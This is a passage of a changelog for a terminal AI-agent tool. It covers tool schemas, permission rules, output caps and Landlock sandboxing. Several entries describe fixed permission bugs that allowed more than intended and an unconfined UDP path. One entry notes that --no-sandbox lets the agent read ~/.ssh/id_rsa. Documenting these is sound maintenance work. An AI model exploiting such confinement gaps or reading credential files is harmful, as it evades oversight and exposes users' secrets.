  exactly that - an ordinary answer, with nothing in it saying the numbers were never looked at.
  It is the failure the argument wrapper already refuses one level out, where a call puts
  arguments inside `call` and beside it, for the same reason. The refusal quotes both back and
  says how to spell either.

  The schema cannot say it: mutual exclusion is `oneOf` or `not`, and neither is a keyword both
  dialects one schema goes out in accept - Google's `Schema` is a closed set of fields with
  neither in it. `anyOf` does not say it either, since a branch per argument still matches a call
  carrying both. So each description says it in words and the tool enforces it.

- Four things a tool description left a model to find out by spending a call. `shell` said "long
  output is cut off at the end" and now says at how many bytes, read off the limits table so that
  `/limit exec:run` moves the sentence too. `context`'s `search` and `log`'s `take` say what
  happens when they are left out, which every other argument that has a default already did.
  `log`'s `kinds` said "spelled as the summary spells them", which is the vocabulary behind the
  thing you need the vocabulary to ask for, and now spells two. And `select` gives three of its
  forms where a call is written rather than only in the tool's description above. 198 bytes a
  request, against four ways to spend a turn learning what a sentence could have said.

- A call asked permission for the one thing it does again, rather than for everything its tool can
  do. `context` reading its own items declared every one of its subjects, so `look` at three
  items asked to be allowed `revise` and `elide` too, and `--allow context:look` on its own could
  not look. The same reading fault had the policy miss the two arguments it consults: a `curl` was
  no longer judged against `net:reach`, and a path rule no longer matched the path a call named.
  Both failed towards allowing more, and neither is visible from anywhere but a live session.

- The permissions tab says what a rule covers. `--allow fs` writes a rule about a whole domain, and
  its row read "nothing registered needs it" while the five `fs:*` rows above it each named `fs`; a
  server rule read the same, with every tool it covers sitting above it. A row was only filled
  where a tool declared that exact capability, and no tool declares a bare domain or a server name.
- The permissions tab draws one row per decision, where a domain rule drew one for every operation
  under it as well. `--allow log` in a settings file read `log  allow  log:read` above
  `log:read  allow  log`, each row naming the other in the column beside it, and `--allow setup`
  put four more of them on the screen. Every capability a registered tool declares is a subject
  here, and a rule about the domain above one makes it a *decided* subject, so one answer was
  listed as the rule and again for every operation it reaches. The operations are in the domain
  row's own column, which is where a rule is read. An operation somebody answered about separately
  keeps its row - `--allow fs --deny fs:write` is two decisions - and one nobody has decided is
  still counted along the bottom.
- What a rule covers is never wider than the rule. An operation's row named the tools that declare
  it, which with one tool to a domain is the subject's own first half read back: `fs:glob  allow
  fs` is a rule about one operation reading as an answer about everything the tool does, next to a
  `log  allow  log:read` that reads the other way round. It names the operation now - a domain
  names the operations in it, an operation names itself, and a server or a path rule names the
  tools it binds.
- `mcp:call` is not counted among the subjects a session will stop and ask about. Every tool from
  a server declares it and `Careful::judges` puts the server's own name in its place where this
  program spawned it, so the figure that says how much is still undecided included a subject
  nothing here is ever judged by. A tool declaring it with nobody holding the far end of it is
  still a question and still counts.
- A networked command allowed in a headless run is granted the network. Everything answering a
  permission question means beyond the decision itself lived in the key handler, and that loop has
  no keys - so `--on-ask allow` let a `curl` through and then ran it with TCP cut. Both drivers
  answer through one place now.
- Nothing a tool returns is uncapped. Every tool this program ships has a row in the limits table
  and reads it; a tool from an MCP server has neither, and fell through to a kernel default of *do
  not truncate* - so a session started with `--mcp` had no ceiling at all on what somebody else's
  server could put in its context. It is cut at the same 32,000 bytes as everything else, though
  not yet by a row `/limit` can change.

- An argument the action a call named does not read is refused, rather than ignored. `log` has
  held its arguments to this since it was written; `fs` and `context` now do too, per *operation*
  rather than per tool, because the mistake actually made is an argument that belongs to a sibling:
  `old` on a `read` is `edit`'s, and `ids` on a `note` reads as the item to annotate when `note`
  writes a new one. An ignored argument comes back as a real answer — the answer to the call
  without it — so a read meant to be narrowed arrives as the whole file with nothing saying so.
  The refusal names the operation the argument belongs to when exactly one does; `ids` is seven of
  `context`'s twelve, and naming the first would report the order of a table as a fact about the
  argument.
- `glob` and `grep` obey a `.gitignore` outside a git repository, which is what `fs` has been
  telling models they do. The walker honours one only inside a repository by default, so outside
  one a session was handed build output while its tool definition said it had been spared it. The
  test that covered this was inside this repository, where the walker finds a `.git` two
  directories up; the second one is under `/tmp` and asserts that nothing above it is a repo.
- `/limit` is keyed by subject and now says so wherever it is spelled out: the error for a subject
  with no number asked for a `<tool>`, and `/help` offered `/limit ID BYTES` under a line about
  each tool's output. A limit stopped being a tool's the day one tool did five things.
- The line after `/model` or `/provider` waits for the switch it asked for. Both hand the round
  trips to a task, because a screen should not stop while a new endpoint is asked what it holds -
  and nothing was waiting for that task, so `/provider URL ID` followed by `/model` answered with
  the *old* model, and a message on the next line could be asked of whichever of the two won the
  race. At a keyboard it usually resolved in the gap before somebody typed; down a pipe there is
  no gap, so a script got the losing side as a matter of course. The wait is in `App::submit`, the
  one door every typed line goes through, so a frame drawn mid-switch is still a frame.
- A rule about a domain covers it, and a rule finer than one is about the part it names.
  `--allow context` allows the lot; `--allow context:note` allows a note and says nothing about
  the rest; `--allow context --deny context:revise` is everything but that one. Both halves were
  wrong before, under the tool names the subjects had then. Four of the changing actions shipped
  pre-seeded as questions, so allowing the tool left an `exclude` still asking, with nothing in
  the words to say which four were the exceptions. And naming one action put the rule beside the
  tool's capability rather than in front of it, so the finer rule was read against a subject
  nobody had answered about and granted nothing at all, which is the worst way for a permission
  rule to be wrong: it reads as given. The one thing a finer rule still cannot do is overrule a
  refusal, because the strictest of everything consulted wins and `--deny` is the last word.
- `--compact` below a third asked for a compaction and got nothing. The compactor took its target
  twenty points under its threshold with a flat floor of ten percent, so `--compact 0.15` started
  at fifteen percent of the limit and aimed at ten - and a context between the two was already
  under the target. The pass fired before every request, found nothing worth taking, said so, and
  left the context exactly where it was, for as long as it stayed in that band. The floor is now a
  fraction of the threshold rather than a constant, which cannot rise above it; `Trim::under` is
  the pair and the reason it has to be ordered, in one place instead of at the call site.
- Everything that counts items for a person counts one of them as `1 item`, and every token
  figure beside one is written with its thousands separator: the context tab's own line, a
  resumed or loaded session, and an undo or a redo. `1 items` is the corner of a screen quietly
  saying it is not looking, and somebody who notices has no way to tell whether the figure beside
  it is approximate too - `6 items, ~16342 tokens` was both at once.
- `/limit` marked every `fs` row `not offered` in a session that was offering `fs`, and told
  anybody setting one that the tool had no next call until something added it. The rows are keyed
  `fs:read` and `fs:grep` because what a whole file costs and what a repo-wide search costs are not
  one number; the check against the registry was comparing that key with a tool id, and five of the
  ten rows have not been tool ids since `fs` became one tool.
- `/load` takes every spelling `/save` does. A session is two files, so `/save notes.jsonl` writes
  `notes.json` beside the log it was named after - and `/load notes.jsonl` took its argument at its
  word and went looking for `notes.jsonl.json`, which nothing had ever written. Both go through one
  function now, and it reads the suffix without regard to case the way `attach` reads an extension,
  so `notes.JSON` names the session on a filesystem that does not care how a name is spelled. The
  stem is left exactly as typed, because that half really does name a different file where it does.
- A rule about `mcp` covers nothing a server this program spawned offers, and both tables that say
  what a rule covers now agree with the one that decides. `Careful::judges` takes `mcp:call` out of
  what it consults for a tool whose server it knows and puts the server's own name there instead,
  so that `--allow-server` is one flag rather than two; the permissions tab and `setup: permissions`
  were filling their coverage column from what a tool *declares*, which is the list before that
  swap. A session run `--allow mcp --mcp big=...` read `mcp:call  allow  big__add, big__spew` and
  then refused the very next call to one of them. That column is the only account of the
  permissions a model ever gets, and it is what a person checks their own flags against.
- The two lines that answered by naming a key now name a command, because a headless run has no
  keyboard and is the same `App`. A request with several repairs in it said `ctrl+p says where` -
  and the list itself goes to the trace, which a headless run does not print, so a session driven
  down a pipe was told to press a key it does not have about a list it could not otherwise see.
  A line that is not a command said `F1 lists what there is`. `/request` and `/help` open the same
  two pages and work in both.
- A tool result put back behind the call it answers is no longer announced as a repair. Nothing is
  lost by one - the request carries every byte it would have - and it stands for as long as the
  item that displaced it does, so `the request is repaired, and will be while this stands` sat in
  the conversation after every note a model wrote, and after every session resumed from one.
  `context: note` writes its item while the call that writes it is still in flight, so it produces
  exactly this shape every time. `/request` and the `enter` view on the context tab say `reordered:`
  where they said `repaired:`, and `context: request` gives it a heading of its own that says it
  costs nothing and is nothing to act on.
- A call whose arguments were not JSON is told that, rather than told an argument is missing.
  `nachalnik-providers` hands the unparsed text over under `_unparsed` so "a model that produces
  invalid JSON gets to see that it did", and nothing here read it: the tool went looking for
  `action`, did not find one, and answered `the \`action\` argument is required` - about a call
  whose text held an `action` and a brace that was never closed. Watched live, on a call that came
  back with an XML tag inside the JSON string. The refusal quotes what arrived, and it is in
  `ops::inner` so all six tools give it.
- `context`'s `search` says that its `text` is text. `fs`'s `grep` is offered in the same request
  and states outright that its `pattern` is a regular expression in Rust's syntax, so a model
  reaching for one in the other search is being consistent - and a live run did, searching a
  context holding `pub fn add` for `pub (fn|const)`. A pattern read as text matches nothing and
  comes back as a plain "no matches", which is the one shape of wrong answer the note on `search`
  says it must not have.
- `/model` and `/provider` drop what the counter learnt, as well as the anchor. Both already drop
  the anchor, on the grounds that it is one model's tokenizer counting one model's request - and
  the correction is the same claim one word further in, cumulative over every observation, so a
  scale learnt from one tokenizer went on correcting the next one's figures and the new model's own
  observations were averaged into the old model's totals. Watched live: a session read a scale of
  1.152 off one model, switched, and settled at 1.017, which is neither model's number.
  `Calibrating::reset` is documented as being for exactly this and had no caller anywhere.
- `undo` no longer describes a note it walked back as going *back to* a state it has never been in.
  The way back from having written one is to put it away, so an undone note is archived and still
  listed - and the report read `10 back to archived` about an item created thirty seconds earlier.
  A live run read exactly that line and told the person the item had been restored to being
  archived. Each line says where its item ended up; the direction is in the sentence above them.

### changed

- The shipped `kamchatka.json` sets no spend ceiling. It carried one of 200,000 tokens, on the
  reasoning that a tightening is the one thing a file adopted sight-unseen can safely offer - and
  the file is the only setting in it that was not the program's own default, in a file whose whole
  claim is that it is the defaults. What the ceiling buys is a session that stops for a reason
  nobody chose, which is its own kind of surprise and a worse one to debug than a missing cap: the
  line says the ceiling was reached and nothing says where the ceiling came from. `spend` is
  `null` with the rest of the unset settings now, and `--spend`, `/spend` or one edit sets it.
  The suite holds the file to leaving `deadline` and `spend` unset, beside the checks that it
  names every key and grants nothing.
- An output limit is two numbers rather than one: 32,000 bytes where the answer is made of what
  the session holds, and 8,000 where it is a report of a fixed shape. Which tier a subject is in
  is measured rather than decided - between a session of ten items and one of a thousand, with two
  hundred more tools registered, seven answers do not move (`fs:write`, `fs:edit`,
  `context:budget`, `context:note`, `context:revise`, `setup:model`, `setup:policy`) and every
  other one does: `context:look` goes from 10kB to 119kB over that pair and `log`'s records from
  30kB to 517kB. The lower number never fires on a healthy session, which is the point of it - one
  of those seven arriving cut is an answer that has quietly started quoting the session, and
  `tests/introspect.rs` holds all seven to it at the size so that the tripwire is the second thing
  to notice rather than the first. `setup tools` groups the exceptions by their figure rather than
  naming it once per subject.
- **`context` has twelve operations, not thirteen: `archive` is gone.** It and `exclude` were one
  behaviour under two words - measured as producing the same request to the token when the moves
  were first named, and nothing in the projector, the compactor, the budget or `search` has ever
  told them apart. What it cost was a thirteenth branch in the schema, a thirteenth subject on two
  tables, and a model choosing between two words for one act. `exclude` says which one it is now:
  reach for it when you are done with something rather than merely finished reading it.

  `ContextState::Archived` stays, because the runtime uses it for the one thing it is a true
  statement about - the whole of a tool output an output limit shortened, kept so the short copy is
  not the only one left - and `state:archived` still selects those. What changed there is the
  documentation: the three states that are not projected are one behaviour under three words,
  nothing in the crate branches on which, and `Excluded` no longer says "and restorable" as though
  the others were not.

- **An operation declares its own arguments.** Each of these tools described itself to the model as
  one property bag holding every argument any of its operations takes, with the applicability
  written into the prose: nineteen descriptions opened `for `grep`:` or `required by the nine that
  change:`. `required` was `["action"]` on five of the six, so a `read` passing `old` was a
  well-formed call right up until it ran. Now there is a branch per shape, each carrying its own
  arguments and its own `required`, and twenty-three arguments are named as required where one was.
  The applicability moves out of the prose and into the schema: inside a branch there is nobody
  else for an argument to be confused with, so each one says what it is and stops.

  The arguments go inside a `call` object, because the root of a schema may not itself be a union.
  Passing them flat, the way the old schema asked for them, is still understood; passing them in
  both places at once is refused, because reading either would drop half of what was asked.

  Operations that read the same arguments are one branch under an `action` of several words, so
  `context`'s five moves are declared once rather than five times, and a tool whose operations all
  read the same arguments gets no union at all.

  It costs about eight hundred tokens a request - the tools section goes from ~2,690 to ~3,500 -
  and that is the price of saying in the schema what eight of `context`'s twelve operations
  previously had to be told at run time, one wasted turn at a time.
- **`context` is one tool over one object**: four operations read the context and eight change it.
  It was `context` and `amend`, on the argument that a `ToolSpec` declares its capabilities once,
  so one tool would have meant that answering *always* to "may it look at its own items?" also
  answered "may it rewrite a tool result?". That hazard is real and it stopped being a reason for
  two tools the day a subject became `<domain>:<operation>` and `Tool::needs` let a call say which
  one it is: `context:look` and `context:revise` are separate rows on the permissions tab
  whichever tool they arrive under, and `--allow context` is how you answer for the lot. What two
  tools cost was the part nothing was measuring - two descriptions in every request, most of each
  spent saying which of the two the other one was.
- **`fork` is its own tool**, with `draft` and `ask`. It was two operations of `context` and it is
  neither a reading nor a change: it stands up a copy of the session and pays a provider for an
  answer. Letting something read its own items should not be letting it buy another request, which
  the subjects had said for a while - `fork:draft` and `fork:ask` were in a domain of their own
  before the tool was.
- **Every tool takes an `action`**, `shell` and `log` included, and each has exactly one:
  `shell` does `run` and `log` does `read`. A word costs nothing beside the rule it completes, and
  the tool that is the exception is the one a model gets wrong - a live session called
  `log {action: "look"}`, got the summary back and cited it as the answer to a question it had not
  asked. That call is now refused by name, and the paragraph of advice written to catch it is gone.
- **`context` takes twelve words and no other spellings.** `prune` with a `state` argument, and
  `unpin`, `unelide`, `unexclude`, `elided`, `excluded`, `active` and `include`, are all gone. They
  were there on the reasoning that accepting a word somebody reached for costs nothing, which was
  true of the word and not of the program: the schema advertises twelve operations, and every
  place that had to answer "which operation is this call" needed a second table of the words that
  are not in it. One list, in the schema, is the whole of the vocabulary.
- **An output limit is keyed by subject**, which is the same string the permissions table is keyed
  on: `/limit fs:grep 8000` and `--allow fs:grep` name the same thing, and `Tool::limit` is one
  line in every tool - the limit for a call is the limit for the subject that call needs. It was
  keyed by tool id, which stopped meaning anything the day one tool did five things of five
  different sizes, and `/limit` was quietly marking every `fs` row `not offered` in a session that
  was offering `fs`. `setup tools` reports them as the figure they share and then whichever ones do
  not, rather than as a column that would have had one number standing for `fs:read` and `fs:grep`
  alike.
- **A pass over the tool definitions took the six of them from 11,369 characters to 10,745**, and
  two of them were wrong. `fs`'s `glob` argument - which is what `grep` filters files by - carried
  the glob *grammar* as its description and never said what it was for, so the schema explained
  the same syntax twice and neither copy said which of the two arguments filtered anything.
  `context`, which still had `archive` at the time, said it put an item away "for good" three
  sentences before saying every item can be restored, and said all nine of the changing operations
  it then had were named for the state they leave, which was true of five. The rest of the
  saving is duplication: sentences in a description that the argument beside it already said, and
  claims a tool was making about how well it reports itself. Every argument now says which
  operation it belongs to the way `fs`'s do - `for `note`: a short name` rather than `note: a
  short name`, which read as a remark.
- **Every tool is offered by default**, the four that read and manage the session among them.
  `--introspect` is gone: it was a flag for those four, answerable only before the session started,
  and what it was really being used for was a fact about a project rather than about an
  invocation. What that costs is the six schemas in every request - 2,738 tokens where `fs` and
  `shell` alone are 810 - and the two settings below are how a session that does not want to pay it
  says so. The settings key went with the flag, and a file is read with `deny_unknown_fields`, so
  a `kamchatka.json` carrying `"introspect"` is refused rather than quietly ignored: it names the
  key and lists the ones there are. `tools` is what it becomes - `[]` for none of them, or the ids
  of the ones to start with.
- `/tools toggle ID` replaces `/tools drop ID` and `/introspect`, and works on every tool there is,
  including the ones an MCP server brought. It goes both ways, which is the half that was missing:
  a dropped tool used to be dropped, and `/introspect` could only put back the one group of four -
  by building new ones, which threw away whatever `amend` was remembering. A tool turned off now is
  kept rather than rebuilt, so the one that comes back is the one that went away, still holding
  what it pinned and what it could still walk back. `/tools` marks the ones that are off, since
  their names are exactly what somebody needs to get them back.
- `tools` in a settings file says which of them a session starts with, by id; left out, all of
  them. `["fs", "shell", "context", "log", "setup"]` is the whole set minus `fork`, which is how a
  project says *do not go buying extra requests*. An empty list offers none of
  them. A name that is not a tool stops the program and says which there are, for the reason an
  unknown key does. The ones left out are still built and can be offered with `/tools toggle` - and a
  `shell` offered that way is confined exactly as one offered at startup would have been.
- `wiring::Setup`'s `builtin_tools` and `introspect` are one field, `tools: Option<Vec<String>>`,
  with the same meanings: `None` is every tool, `Some(vec![])` builds none at all.
- `budget` names the held-back states instead of counting them off as "the first three", which
  models read as item ids. It names the two the model sets (`excluded`, `elided`) apart from
  `archived`, which is where an undone note and the whole of a shortened answer go rather than
  somewhere to send one - it said all three were the model's to set for as long as `archive` was
  an action, and went on saying it after the word left the vocabulary.
- `context` says in words which way the request figure went - smaller, larger or unchanged - and
  that the `from ~` figure is what the request cost when the change found it, not what an earlier
  `budget` reported. Models compared against a remembered figure and read drops as growth.
- The status line ends at the figures; `F1 for the keys` is off it. `esc stops it` stays. The live
  suite no longer tests how the line narrows - `edges.rs` pins that offline.
- A release archive is the binary and `kamchatka.json`, and nothing else. The licence and the four
  documents are out; they are a link away and always current.
- One fewer direct dependency: `async-trait` is the runtime's, and every `#[async_trait]` here is
  already written against `nachalnik`'s re-export. Depending on it twice let the two drift.
- `ratatui` is taken with three of its five default features. `macros` is out because `ui` builds
  its layout from calls rather than from a declaration, and `all-widgets` because its only member
  is the calendar.

## [0.11.0] - 2026-09-15

### added

- `grep` takes `files_only`: every file that matched and how many matches it has, most first,
  instead of the lines. Against this repository a broad search costs 3,223 tokens of lines and never
  reaches the file in question; `files_only` costs 894 and sees all 205 files. A capped answer names
  it first among the things to try.
- `grep` and `glob`, declaring `read` rather than `shell` - so a read-only session can search. Built
  on ripgrep's engine (`grep-searcher`, `grep-regex`, `ignore`, `globset`) linked in, so no `rg` on
  the machine and no second process for the sandbox.

  The cut is at matches, not bytes: a hundred matches, lines cut at two hundred characters, and a
  first line saying it stopped and what to do. The answer reports files searched and a `skipped:`
  line naming each reason, so "it is not there" can be told from "nothing was opened". A path rule
  that is not `allow` stops the walk opening that file. `.gitignore` is obeyed and `.git` always
  skipped; hidden files *are* searched. Results are sorted, so two identical searches are one
  context item. A symlink is read where it points inside the working directory.
- `/note TEXT` puts a fact in the context without starting a turn. Goes in as `ContextItem::memory`,
  so the model sees `note:` in front of it and `/exclude memories` names every one. Not pinned.
- A shell result's exit line is coloured: green for success, red for failure, yellow where the
  command never reported - stopped by the person, killed by a signal, or an unreadable status. On
  Windows a killed child arrives as an ordinary exit code, so only this program's own stop is yellow
  everywhere. The reading lives in `tools::shell` as `Exit`, beside the writing of it.
- A resumed session reads back what its items used to say. A `Snapshot` carries items, not events,
  so `-r` came back with every `v1` page empty; `App::recall` now walks the sibling `.jsonl`'s
  `context.replaced` records. Best effort - a missing or truncated log costs a page, not a session.
  It does not carry lineage forward: a resumed session's log starts at `session.resumed`.
- `"border": "#7aa2f7"` in the settings file sets the window frame and everything else that is
  yellow to mean *the keys are here*. Left out or `null`, it stays the terminal's own yellow. It
  does not touch the vocabulary: `ask`, a full budget bar, a killed command and a pinned row stay
  yellow, and red is left alone. A value that is not six hex digits stops the program, headless too.
- A release attaches a static `x86_64-unknown-linux-musl` binary, built from a `kamchatka-v*` tag,
  with a `sha256`. Static musl, so there is no glibc floor; the whole suite including the Landlock
  tests passes against that target. `panic = "abort"` is deliberately not set - a panicking tool is
  reported and the turn carries on.
- A permission question draws an `edit` as a diff: `old` red, `new` green. By argument name rather
  than by tool, so an MCP tool using those names reads the same way.

### breaking

- Four of this crate's own items moved with the permission rework, which matters to whoever is
  embedding it rather than running it. `tools::acts_on` is gone: it asked the tool registry at run
  time which tool a subject belonged to, and a subject is declared now rather than inferred from a
  string's shape. `tools::Limits::apply` is gone with it - a limit is answered per call through
  `Tool::limit` instead of written onto a `ToolSpec` once. `tools::Careful::stances` answers in
  `Subject` rather than in `nachalnik::Capability`, because a rule here is one of four kinds and
  only one of them is a capability. And `mcp::attach` takes the policy as its second argument, so
  it can say which tools came from which server - that is what `--allow-server <name>` answers
  for, a prefix is optional and is dropped when a name would not otherwise fit, and the only thing
  that reliably knows where a tool came from is whatever installed it.
- `introspect::Amend` is no longer a tool, or public. It and `Context` are one tool over one
  object; see the entry below for why the two were ever separate.

### changed

- `--no-sandbox` is documented as turning off every tool's confinement, not just the shell's. It
  sets `Reach::confined` as well as dropping the Landlock ruleset, so `read` of `~/.ssh/id_rsa`
  becomes a file rather than a refusal.
- `--compact` says the oldest tool results are *elided*, not dropped.
- The tool descriptions were rendered as they go out (3,356 tokens per request) and corrected. One
  was false: `grep` and `glob` claimed to skip symlinks. One was unusable advice: `read` pointed at
  the shell, which a read-only session refuses; it names `grep` now.
- `grep`'s `context` argument says so when the answer is capped below what was asked for, instead of
  clamping silently.
- `Going` is `#[non_exhaustive]`. It gained `holds`, and a struct of public fields cannot gain one
  without breaking literal construction. `Going::of` is where it comes from.
- `grep` reads a quoted `"3"` or `"true"` as the number or boolean it plainly is, and refuses
  anything else by name rather than falling back to the default. The default for `files_only` is the
  expensive answer, so a swallowed argument cost three thousand tokens.
- <kbd>up</kbd> in an empty prompt puts the last message back - the one waiting for a running turn
  to end, or else a copy of the last line sent. A waiting message is taken, a sent one copied. One
  deep, and only from an empty prompt. <kbd>down</kbd> puts a recalled line away again.
- <kbd>←</kbd> and <kbd>→</kbd> move a cursor within a `/` query, and <kbd>delete</kbd> works. The
  arrows, paging, <kbd>home</kbd> and <kbd>end</kbd> stay with the pane.
- <kbd>ctrl+l</kbd> clears this program's own `·` notes off the chat. The conversation stays,
  because the conversation *is* the context; a line still arriving stays too.
- An edit at the terminal rewrites the item through `Kernel::replace` instead of superseding it, so
  there is one row with the number the item always had, its existing state, and `v1` under
  <kbd>enter</kbd>. The item records `revised: {by: user}` on its `meta`. `Kernel::supersede` keeps
  its place in the runtime.
- <kbd>/</kbd> on the context tab matches the kind column too, via `ContextKind::name`, whether or
  not that column is drawn. The state stays out: `/prune state:excluded` already asks that.

### fixed

- The compaction marker says what to do rather than only what happened: *reading it again would put
  the same tokens back into a context that had no room for them - ask for the part you need
  instead*. Before it, a model read one file ten times; after, once.
- A session no longer writes its record over another's. Two runs starting inside one second share a
  stamp, and a resumed session keeps the name of the session it resumed - so `-r` overwrote the file
  it had just read. The name stays and the file moves to `…Z-2.jsonl`, claimed with `create_new`.
- The `held` column, the corner figure and `/budget` count what the request does not carry per item
  (`item.tokens` less its projected message), rather than the whole of an item that is not in it. An
  assistant turn whose reasoning the endpoint will not take showed blank while holding 25,903
  tokens. It is a figure about the endpoint, not about reasoning, and not a suggestion to prune.
- `context: budget` ranks the expensive items by what they *send*, not what they hold, and the
  column is headed `sending`. A turn holding 25,903 tokens and sending 1,035 stood at the top,
  offering an elision that would free a thousand. `look` gained the second column for the same
  reason, and says that giving a row up frees what it sends and none of what it holds.
- `Going` counts what an item holds and what its message costs at the same moment with the same
  counter. `Calibrating` moves the scale on every response and items keep their figure until a turn
  ends, so every reading taken inside a turn compared two scales - and the `context` tool is only
  ever called inside one.
- <kbd>e</kbd> declines an item a prompt cannot hold - a call-only turn, a picture, or a turn
  recorded in block order - and says why in a panel over the row. It used to open an empty box and
  commit a sentence onto a turn whose call it had not touched.

## [0.10.0] - 2026-09-14

### added

- `amend: note` says when the label is already taken, and names `revise`. A label finds an item
  again rather than standing for one, so five notes under one name left five live assertions that
  compaction could not clear. Unlabelled notes, and archived or excluded ones, do not count.
- Permission rules can name one tool action: `<tool>:<action>`, shipped for `amend:elide`,
  `amend:exclude`, `amend:archive` and `amend:revise`. Each is `ask` until answered, whatever
  `amend` itself says, so `--allow amend,amend:note` lets notes through while `exclude` asks. An
  action rule can only *tighten*. A tool whose actions nobody has an opinion about is judged by its
  capability as before.

  **`--allow amend` no longer covers those four** - the one thing here that will surprise an
  existing settings file.
- `context: request` reports items left out by their own state separately from items the projector
  dropped. `restore` fixes the first and does nothing for the second.
- `setup`, a fourth introspection tool, for what the session is running *with* rather than what
  happened. `model` (model, parameters, context limit, and whether the session was **resumed from a
  snapshot**), `tools`, `permissions`, and `policy` (compactor and projector). Pending permission
  requests are listed. It reads `Careful`'s table rather than calling `evaluate`, which would evict
  entries from the bounded queue of refusal reasons. Declares `Capability::Custom("setup")`, output
  limit 32,000 bytes, 255 tokens of spec; the four introspection tools total 1,846.
- `context: search` reads the archive without copying it back. Answers with how many lines match,
  what taking them would cost, and which items they are in; `take` shows that many. It never returns
  the item. Case is ignored.
- `log`, a third introspection tool: the session's record from the inside - what an item used to
  say, which permissions were answered how, which tools came and went.

  Every answer opens with the true total, which is what makes it safe to hand a model: a bare call
  returns no records, only how many there are, of what kinds, and what taking them would cost.
  `take`, `ids`, `since` and `kinds` narrow, against a header stating what exists rather than what
  matched, so truncation cannot read as absence. A malformed filter is refused rather than answered
  with an empty list, and a filter matching nothing lists the kinds the session does hold.

  Records come back raw, named the way the kernel names them, detailed by the same function that
  writes the trace pane. Declares `Capability::Custom("log")`, so it is separately grantable and
  revocable. No runtime change: `Kernel::with_history` was already there.

### changed

- `introspect` is called `context` - the tool id, the capability and the struct. The module, the
  `--introspect` flag and the `/introspect` command are unchanged.

  **A permission rule naming `introspect` stops matching** rather than failing, since nothing
  declares that capability any more. Spell it `context`; no alias is accepted. The tools are off by
  default, so a session that never passed `--introspect` is unaffected.
- A tool call on the trace is cyan, matching the chat tab. `.failed` still matches first.
- The UDP wording names the `landlock` crate rather than the LSM. ABI 10 (Linux 7.2) added the two
  UDP rights; the crate stops at ABI 9 and is `#[non_exhaustive]` over a sealed trait, so they
  cannot be requested from here. Nothing about the confinement changed. A test asserts the hole and
  is there to fail when the crate catches up. `AccessNet::ConnectTcp | AccessNet::BindTcp` stays
  spelled out rather than `from_all`, which would silently start handling UDP on a `cargo update`.

### fixed

- `/save sessions/` writes into the directory under the session's own name instead of creating
  `sessions/.json` and `sessions/.jsonl`.
- `/limit` marks rows for tools the session is not offering, instead of listing six in a session
  with four. The rows belong there: a limit set before a tool arrives is what it declares on
  arrival.
- `amend` reports a re-request of the state an item is already in as a rewritten reason rather than
  a move, and no longer puts a no-op step in its journal.
- `context: search` refuses a `take` it cannot read, rather than silently falling back to the
  summary, and `take: 0` no longer prints a heading with nothing under it.
- `context: search` counts what it actually read. `ids: [99]` in a session with no item 99 reported
  having searched it and found nothing; ids naming nothing are now named, including on an answer
  that found something.
- A second failure with the same wording is no longer swallowed. The dedup compared against the last
  *loose* line, which outlives its turn; it is scoped to the running turn now.
- Five things found by a live model resuming a session under a *second* model and being asked
  whether it wrote a turn the first one wrote:
  - `log` refuses arguments it does not take, with a sentence for `action` in particular. It used to
    answer `log {action: "look"}` as though nothing were wrong.
  - `log ids:[n]` reports an absence explicitly, in the zero-match case too. Five true
    `model.requested` rows were read as proof the model had written the item itself; what settled it
    was the `context.added` that was not there.
  - `since` is documented as exclusive, and `0` is named as the way to ask for everything. A model
    wrote `since: 1` and skipped `session.resumed`, the record that answered its question.
  - An empty filter list is accepted - it constrains nothing.
  - `look` opens with which items were already in the context and points at `setup model`. A
    restored item has no field marking it, so the listing read as though the model wrote all of it.
- The `amend` warning about hiding items with nothing written down no longer claims the content is
  destroyed. An elided item keeps every byte and only *projects* as a marker; a live session read
  the old wording and told its user the content was unrecoverable.
- A fork says when it left nothing out, so a question asking a model to disregard something is not
  reported as an ablation. `context`'s description also says its actions are actions of that tool -
  a model called `fork(...)` as a bare tool, then excluded the item from its own live session
  instead.
- A drained log says how many records went through it and where the next one starts, rather than
  "this session's log is empty, which is not the same as a log you have not been shown".
- A compaction record carries `CompactionReport::reason`, so a pass can be told from a pass that
  should not have happened.
- Answers no longer name tools the session has had taken away.
- Four things found by reading the real output: a filtered `log` header built from one prefix that
  fitted only half the sentence and reported the total as a match count; `short` took the last `::`
  segment, naming `Calibrating<BytesPerToken>` as `BytesPerToken>`; `setup` printed a full Rust path
  and listed eleven `ask` path rules at ninety tokens.
- `/introspect` and `--introspect`'s help name all four tools. The screen test now reads the
  announcement beside the registry.
- `log`'s "there are no actions here" reads the registry rather than a fixed list of siblings.
- Prose four changes had made false, in three notes, the module and crate docs, the README and
  `examples/recorded.rs`.

## [0.9.0] - 2026-09-12

### breaking

- `app::Traced` grew `wall: SystemTime` and `after_a_person: bool`. It has no private fields and is
  not `#[non_exhaustive]`, so `Traced { name, detail, at }` no longer compiles and there is no
  `Default` to spread from.
- `ui::HELP` is gone. `help::SECTIONS` is one page per tab and `help::everything()` is the whole of
  it as one string. `ui` re-exports both; `help` is a public module, so a screenless build can reach
  the text.

### changed

- F1 opens at the page for the tab it was pressed from - one page per tab, plus the slash commands
  and the keys that mean the same thing everywhere, plus a seventh while a tool is waiting. It was
  eight sections and about a hundred lines wherever it was pressed. Pages rather than a filter, so
  nothing is lost. A headless `/help` prints `help::everything()`.
- The trace's gap column is blank on the line that ends a wait for a person, so the largest figure
  in it is no longer how long somebody spent reading. `Traced::after_a_person` carries it, set where
  the program learns somebody acted rather than where the waiting began. The clock itself is
  untouched.

### added

- `/` filters the context and the trace, fuzzily, via `nucleo-matcher`. One row high, in the
  prompt's place, counting what it found beside the query. It takes `esc` before the arm that reads
  it as "stop the turn"; `ctrl+c` still interrupts. Arrows and paging stay with the pane. Closing or
  changing tabs clears it. A context row matches on the whole item, not the one line it shows.
- The trace shows when each event happened as well as the gap. An event carries two clocks: `at`
  stays an `Instant`, immune to the system clock being set mid-session, and `wall` is a `SystemTime`
  and is what gets rendered. The date is a rule drawn only where it changes, with the zone named.
  `time` is no longer optional, so a headless build pays for it; the local offset is read in `main`
  before the runtime is built, because `time` refuses once a program is threaded, and falls back to
  UTC and marks it.

### fixed

- `?` answers on an empty context or permissions tab. Both handlers return early with no rows, and
  `?` was inside the skipped part. It is answered beside F1 now, guarded by `Focus::Body`.
- Each pane says which of its empties it is in. The trace claimed a search was filtering a session
  that had not started; the context blamed `f` for rows a query had hidden, over a count that was
  both filters added together. No count is given while a search is on.
- `~` in a settings file expands on Windows: `HOME`, then `USERPROFILE`. The home is an argument
